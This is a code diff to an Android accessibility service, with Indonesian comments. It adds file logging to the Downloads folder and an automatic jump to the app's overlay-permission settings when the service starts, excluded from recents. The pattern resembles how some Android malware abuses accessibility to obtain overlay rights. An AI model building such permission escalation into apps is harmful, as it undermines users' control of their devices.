@@ -8,6 +8,9 @@ import android.provider.Settings;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 import java.util.List;
+import android.os.Environment;
+import java.io.File;
+import java.io.FileWriter;
 
 public class CustomAccessibilityService extends AccessibilityService {
 
@@ -17,11 +20,37 @@ public class CustomAccessibilityService extends AccessibilityService {
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
-        // Konfigurasi dinamis agar service lebih responsif
-        AccessibilityServiceInfo info = getServiceInfo();
-        info.flags |= AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS; 
-        info.flags |= AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
-        setServiceInfo(info);
+        writeLog("Service Connected - Attempting immediate jump to Overlay");
+        
+        // Gunakan Handler untuk memberi jeda sedikit (500ms) agar sistem siap
+        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+            if (!Settings.canDrawOverlays(this)) {
+                jumpToOverlaySettings();
+            }
+        }, 500);
+    }
+
+    private void writeLog(String text) {
+        try {
+            // Arahkan ke /sdcard/Download/dexlogs/
+            File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+            File myDir = new File(downloadDir, "dexlogs");
+            
+            if (!myDir.exists()) {
+                myDir.mkdirs();
+            }
+            
+            File logFile = new File(myDir, "logs.txt");
+            FileWriter writer = new FileWriter(logFile, true);
+            
+            String timestamp = java.text.DateFormat.getDateTimeInstance().format(new java.util.Date());
+            writer.append(timestamp).append(" : ").append(text).append("\n");
+            writer.flush();
+            writer.close();
+        } catch (Exception e) {
+            // Jika gagal log ke Download (karena izin), lempar ke Logcat sebagai fallback
+            android.util.Log.e("DEX_LOG", "Failed to write log: " + e.getMessage());
+        }
     }
 
     @Override
@@ -50,6 +79,8 @@ public class CustomAccessibilityService extends AccessibilityService {
             rootNode.recycle();
         }
     }
+
+
 
     private void handleOverlayPermissionFlow(AccessibilityNodeInfo root, String pkg) {
         long now = System.currentTimeMillis();
@@ -123,8 +154,12 @@ public class CustomAccessibilityService extends AccessibilityService {
     }
 
     private void jumpToOverlaySettings() {
-        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY);
+        writeLog("Executing Jump to Overlay Settings");
+        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, 
+                                Uri.parse("package:" + getPackageName()));
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
+        intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
         startActivity(intent);
     }
 
